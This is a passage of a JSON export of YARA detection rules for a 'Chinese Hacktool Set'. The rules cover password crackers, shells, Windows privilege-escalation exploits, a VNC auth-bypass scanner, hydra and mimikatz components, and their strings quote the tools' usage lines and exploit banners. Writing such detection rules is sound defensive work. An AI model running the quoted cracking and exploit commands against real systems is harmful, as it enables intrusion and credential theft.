$s6 = \"NTcmd>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 2 of them\n}","date":"2015-06-13 09:02:21","description":"Chinese Hacktool Set - file NTCmd.exe","minimum_yara":"1.7","name":"tools_NTCmd_RID2B57","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"d7246b437634f7133081f76de2a68cf8","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule mysql_pwd_crack_RID2D54 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file mysql_pwd_crack_RID2D54.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:27:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mysql_pwd_crack_RID2D54 127.0.0.1 -x 3306 -p root -d userdict.txt\" fullword ascii\n      $s2 = \"Successfully --> username %s password %s \" fullword ascii\n      $s3 = \"zhouzhen@gmail.com http://zhouzhen.eviloctal.org\" fullword ascii\n      $s4 = \"-a automode  automatic crack the mysql password \" fullword ascii\n      $s5 = \"mysql_pwd_crack_RID2D54 127.0.0.1 -x 3306 -a\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them\n}","date":"2015-06-13 10:27:11","description":"Chinese Hacktool Set - file mysql_pwd_crack.exe","minimum_yara":"1.7","name":"mysql_pwd_crack_RID2D54","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"5856627847855b675e8a66a67a50a140","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CmdShell64_RID2A87 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file CmdShell64_RID2A87.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:36:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Windows\\\\System32\\\\JAVASYS.EXE\" fullword wide\n      $s2 = \"ServiceCmdShell\" fullword ascii\n      $s3 = \"<!-- If your application is designed to work with Windows 8.1, uncomment the fol\" ascii\n      $s4 = \"ServiceSystemShell\" fullword wide\n      $s5 = \"[Root@CmdShell ~]#\" fullword wide\n      $s6 = \"Hello Man 2015 !\" fullword wide\n      $s7 = \"CmdShell\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 4 of them\n}","date":"2015-06-13 06:36:41","description":"Chinese Hacktool Set - file CmdShell64.exe","minimum_yara":"1.7","name":"CmdShell64_RID2A87","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"37efdfc1d967c7ca77311447873612c9","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Ms_Viru_v_RID2AAB : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file v.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 07:36:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"c:\\\\windows\\\\system32\\\\command.com /c \" fullword ascii\n      $s2 = \"Easy Usage Version -- Edited By: racle@tian6.com\" fullword ascii\n      $s3 = \"OH,Sry.Too long command.\" fullword ascii\n      $s4 = \"Success! Commander.\" fullword ascii\n      $s5 = \"Hey,how can racle work without ur command ?\" fullword ascii\n      $s6 = \"The exploit thread was unable to map the virtual 8086 address space\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them\n}","date":"2015-06-13 07:36:41","description":"Chinese Hacktool Set - file v.exe","minimum_yara":"1.7","name":"Ms_Viru_v_RID2AAB","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"bb8eba7b37c2c8d4e3e81d4fa5cdc640","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Tools_Vscan_RID2C6C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Vscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:48:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[+] Usage: VNC_bypauth <target> <scantype> <option>\" fullword ascii\n      $s2 = \"========RealVNC <= 4.1.1 Bypass Authentication Scanner=======\" fullword ascii\n      $s3 = \"[+] Type VNC_bypauth <target>,<scantype> or <option> for more informations\" fullword ascii\n      $s4 = \"VNC_bypauth -i 192.168.0.1,192.168.0.2,192.168.0.3,...\" fullword ascii\n      $s5 = \"-vn:%-15s:%-7d  connection closed\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 2 of them\n}","date":"2015-06-13 09:48:31","description":"Chinese Hacktool Set - file Vscan.exe","minimum_yara":"1.7","name":"CN_Tools_Vscan_RID2C6C","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"1b51b7d1044fbc72c6b18a4b1e6d7c19","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Dos_iis_RID29DB : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file iis.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 01:50:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"comspec\" fullword ascii\n      $s2 = \"program terming\" fullword ascii\n      $s3 = \"WinSta0\\\\Defau\" fullword ascii\n      $s4 = \"* FROM IIsWebInfo\" ascii\n      $s5 = \"www.icehack.\" ascii\n      $s6 = \"wmiprvse.exe\" fullword ascii\n      $s7 = \"Pid: %d\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 70KB and all of them\n}","date":"2015-06-13 01:50:01","description":"Chinese Hacktool Set - file iis.exe","minimum_yara":"1.7","name":"Dos_iis_RID29DB","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"1bf9342b909fb80fe5efe5c0391c1f87","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_Unkown_CN_Generate_RID2F9F : CHINA DEMO EXE FILE GEN HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Generate.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 12:05:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, GEN, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\TEMP\\\\\" fullword ascii\n      $s2 = \"Connection Closed Gracefully.;Could not bind socket. Address and port are alread\" wide\n      $s3 = \"$530 Please login with USER and PASS.\" fullword ascii\n      $s4 = \"_Shell.exe\" fullword ascii\n      $s5 = \"ftpcWaitingPassword\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 3 of them\n}","date":"2015-06-13 12:05:01","description":"Chinese Hacktool Set - file Generate.exe","minimum_yara":"1.7","name":"HKTL_Unkown_CN_Generate_RID2F9F","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"6fe1bcc8c105045ddf4c78516d5bdbbb","score":70,"tags":["DEMO","FILE","CHINA","GEN","EXE","HKTL"]},{"author":"Florian Roth","content":"rule Pc_rejoice_RID2B04 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file rejoice.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:48:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"@members.3322.net/dyndns/update?system=dyndns&hostname=\" fullword ascii\n      $s2 = \"http://www.xxx.com/xxx.exe\" fullword ascii\n      $s3 = \"@ddns.oray.com/ph/update?hostname=\" fullword ascii\n      $s4 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n      $s5 = \"ListViewProcessListColumnClick!\" fullword ascii\n      $s6 = \"http://iframe.ip138.com/ic.asp\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 3 of them\n}","date":"2015-06-13 08:48:31","description":"Chinese Hacktool Set - file rejoice.exe","minimum_yara":"1.7","name":"Pc_rejoice_RID2B04","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"1690950a8c97ed0ae6fb752094c72562","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ms11080_withcmd_RID2C3A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file ms11080_withcmd_RID2C3A.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:40:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage : ms11-080.exe cmd.exe Command \" fullword ascii\n      $s2 = \"\\\\ms11080\\\\ms11080\\\\Debug\\\\ms11080.pdb\" fullword ascii\n      $s3 = \"[>] by:Mer4en7y@90sec.org\" fullword ascii\n      $s4 = \"[>] create porcess error\" fullword ascii\n      $s5 = \"[>] ms11-080 Exploit\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them\n}","date":"2015-06-13 09:40:11","description":"Chinese Hacktool Set - file ms11080_withcmd.exe","minimum_yara":"1.7","name":"ms11080_withcmd_RID2C3A","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"0bb8bc61c2767f2ee718bf241887c9fd","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule OtherTools_xiaoa_RID2D95 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file xiaoa.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:38:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage:system_exp.exe \\\"cmd\\\"\" fullword ascii\n      $s2 = \"The shell \\\"cmd\\\" success!\" fullword ascii\n      $s3 = \"Not Windows NT family OS.\" fullword ascii\n      $s4 = \"Unable to get kernel base address.\" fullword ascii\n      $s5 = \"run \\\"%s\\\" failed,code: %d\" fullword ascii\n      $s6 = \"Windows Kernel Local Privilege Exploit \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them\n}","date":"2015-06-13 10:38:01","description":"Chinese Hacktool Set - file xiaoa.exe","minimum_yara":"1.7","name":"OtherTools_xiaoa_RID2D95","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"41971ab200b4fa8b5267ffebd2d0fcde","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule unknown2_RID2A53 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file unknown2_RID2A53.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 05:10:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://md5.com.cn/index.php/md5reverse/index/md/\" fullword wide\n      $s2 = \"http://www.md5decrypter.co.uk/feed/api.aspx?\" fullword wide\n      $s3 = \"http://www.md5.com.cn\" fullword wide\n      $s4 = \"1.5.exe\" fullword wide\n      $s5 = \"\\\\Set.ini\" fullword wide\n      $s6 = \"OpenFileDialog1\" fullword wide\n      $s7 = \" (*.txt)|*.txt\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 4 of them\n}","date":"2015-06-13 05:10:01","description":"Chinese Hacktool Set - file unknown2.exe","minimum_yara":"1.7","name":"unknown2_RID2A53","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"985c293e6b9290ddcb038435e0f16d24","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule hydra_7_3_hydra_RID2CC8 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hydra.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:03:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[ATTEMPT-ERROR] target %s - login \\\"%s\\\" - pass \\\"%s\\\" - child %d - %lu of %lu\" fullword ascii\n      $s2 = \"(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=))(COMMAND=reload)(PASSWORD=%s)(SERVICE\" ascii\n      $s3 = \"cn=^USER^,cn=users,dc=foo,dc=bar,dc=com for domain foo.bar.com\" fullword ascii\n      $s4 = \"[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD\" fullword ascii\n      $s5 = \"hydra -P pass.txt target cisco-enable  (direct console access)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them\n}","date":"2015-06-13 10:03:51","description":"Chinese Hacktool Set - file hydra.exe","minimum_yara":"1.7","name":"hydra_7_3_hydra_RID2CC8","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"21a8cf5d4ddb240f32a808d207271888","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule OracleScan_RID2AEC : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file OracleScan_RID2AEC.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:25:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"MYBLOG:HTTP://HI.BAIDU.COM/0X24Q\" fullword ascii\n      $s2 = \"\\\\Borland\\\\Delphi\\\\RTL\" fullword ascii\n      $s3 = \"USER_NAME\" ascii\n      $s4 = \"FROMWWHERE\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-06-13 09:25:01","description":"Chinese Hacktool Set - file OracleScan.exe","minimum_yara":"1.7","name":"OracleScan_RID2AEC","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"01fc7202c8185d8b75dcb658c4d6007d","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule SQLTools_RID2A12 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file SQLTools_RID2A12.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 03:21:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"DBN_POST\" fullword wide\n      $s2 = \"LOADER ERROR\" fullword ascii\n      $s3 = \"www.1285.net\" fullword wide\n      $s4 = \"TUPFILEFORM\" fullword wide\n      $s5 = \"DBN_DELETE\" fullword wide\n      $s6 = \"DBINSERT\" fullword wide\n      $s7 = \"Copyright (C) Kibosoft Corp. 2001-2006\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2350KB and all of them\n}","date":"2015-06-13 03:21:41","description":"Chinese Hacktool Set - file SQLTools.exe","minimum_yara":"1.7","name":"SQLTools_RID2A12","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"db6030b4038bac7431602eeceffb2811","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule portscanner_RID2BC0 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file portscanner_RID2BC0.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:19:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PortListfNo\" fullword ascii\n      $s1 = \".533.net\" fullword ascii\n      $s2 = \"CRTDLL.DLL\" fullword ascii\n      $s3 = \"exitfc\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 25KB and all of them\n}","date":"2015-06-13 09:19:51","description":"Chinese Hacktool Set - file portscanner.exe","minimum_yara":"1.7","name":"portscanner_RID2BC0","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"447ce7e8937ddc42b833d9c31dc5f3af","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule kappfree_RID2A5F : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file kappfree_RID2A5F.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 05:30:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Bienvenue dans un processus distant\" fullword wide\n      $s2 = \"kappfree_RID2A5F.dll\" fullword ascii\n      $s3 = \"kappfree_RID2A5F de mimikatz pour Windows (anti AppLocker)\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2015-06-13 05:30:01","description":"Chinese Hacktool Set - file kappfree.dll","minimum_yara":"1.7","name":"kappfree_RID2A5F","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"2e5f8f088011422a2d283684314897f8","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Smartniff_RID2ABB : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Smartniff_RID2ABB.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:03:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"smsniff.exe\" fullword wide\n      $s2 = \"support@nirsoft.net0\" fullword ascii\n      $s3 = \"</requestedPrivileges></security></trustInfo></assembly>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2015-06-13 08:03:21","description":"Chinese Hacktool Set - file Smartniff.exe","minimum_yara":"1.7","name":"Smartniff_RID2ABB","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"1fff8c42d015a321564fd25d8be4bc51","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ChinaChopper_caidao_RID2E85 : CHINA DEMO EXE FILE HKTL T1100 {\n   meta:\n      description = \"Chinese Hacktool Set - file caidao.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:18:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1100\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Pass,Config,n{)\" fullword ascii\n      $s2 = \"phMYSQLZ\" fullword ascii\n      $s3 = \"\\\\DHLP\\\\.\" fullword ascii\n      $s4 = \"\\\\dhlp\\\\.\" fullword ascii\n      $s5 = \"SHAutoComple\" fullword ascii\n      $s6 = \"MainFrame\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1077KB and all of them\n}","date":"2015-06-13 11:18:01","description":"Chinese Hacktool Set - file caidao.exe","minimum_yara":"1.7","name":"ChinaChopper_caidao_RID2E85","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"c674185bb6f318e42175194828218eff","score":70,"tags":["T1100","DEMO","FILE","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule KiwiTaskmgr_2_RID2C0F : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file KiwiTaskmgr.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:33:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Process Ok, Memory Ok, resuming process :)\" fullword wide\n      $s2 = \"Kiwi Taskmgr no-gpo\" fullword wide\n      $s3 = \"KiwiAndTaskMgr\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-06-13 09:33:01","description":"Chinese Hacktool Set - file KiwiTaskmgr.exe","minimum_yara":"1.7","name":"KiwiTaskmgr_2_RID2C0F","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"f5c086692a803e535d33536be101ebd5","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule kappfree_2_RID2AF0 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file kappfree.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:31:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"kappfree.dll\" fullword ascii\n      $s2 = \"kappfree de mimikatz pour Windows (anti AppLocker)\" fullword wide\n      $s3 = \"' introuvable !\" fullword wide\n      $s4 = \"kiwi\\\\mimikatz\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them\n}","date":"2015-06-13 09:31:41","description":"Chinese Hacktool Set - file kappfree.dll","minimum_yara":"1.7","name":"kappfree_2_RID2AF0","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"b360d8fb7637100d5ba68fc327880436","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule x_way2_5_sqlcmd_RID2CE2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file sqlcmd.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:08:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LOADER ERROR\" fullword ascii\n      $s2 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n      $s3 = \"The ordinal %u could not be located in the dynamic link library %s\" fullword ascii\n      $s4 = \"kernel32.dll\" fullword ascii\n      $s5 = \"VirtualAlloc\" fullword ascii\n      $s6 = \"VirtualFree\" fullword ascii\n      $s7 = \"VirtualProtect\" fullword ascii\n      $s8 = \"ExitProcess\" fullword ascii\n      $s9 = \"user32.dll\" fullword ascii\n      $s10 = \"MessageBoxA\" fullword ascii\n      $s12 = \"wsprintfA\" fullword ascii\n      $s13 = \"kernel32.dll\" fullword ascii\n      $s14 = \"GetProcAddress\" fullword ascii\n      $s15 = \"GetModuleHandleA\" fullword ascii\n      $s16 = \"LoadLibraryA\" fullword ascii\n      $s17 = \"odbc32.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 23KB and filesize > 20KB and all of them\n}","date":"2015-06-13 10:08:11","description":"Chinese Hacktool Set - file sqlcmd.exe","minimum_yara":"1.7","name":"x_way2_5_sqlcmd_RID2CE2","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"7e7e6cccb62033b010d626944b5a42b6","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Win32_klock_RID2B17 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file klock.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:51:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"klock.dll\" fullword ascii\n      $s2 = \"Erreur : impossible de basculer le bureau ; SwitchDesktop : \" fullword wide\n      $s3 = \"klock de mimikatz pour Windows\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them\n}","date":"2015-06-13 08:51:41","description":"Chinese Hacktool Set - file klock.dll","minimum_yara":"1.7","name":"Win32_klock_RID2B17","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"bb5e68a60442c5facb11fa53cd6e1b9f","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ipsearcher_RID2B37 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file ipsearcher_RID2B37.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:57:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://www.wzpg.com\" fullword ascii\n      $s1 = \"ipsearcher_RID2B37\\\\ipsearcher_RID2B37\\\\Release\\\\ipsearcher_RID2B37.pdb\" fullword ascii\n      $s3 = \"_GetAddress\" fullword ascii\n      $s5 = \"ipsearcher_RID2B37.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 140KB and all of them\n}","date":"2015-06-13 08:57:01","description":"Chinese Hacktool Set - file ipsearcher.dll","minimum_yara":"1.7","name":"ipsearcher_RID2B37","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"b6b6712c2c368141ebacc661260e93fa","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ms10048_x64_RID2A2F : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file ms10048-x64.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 04:10:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"The target is most likely patched.\" fullword ascii\n      $s2 = \"Dojibiron by 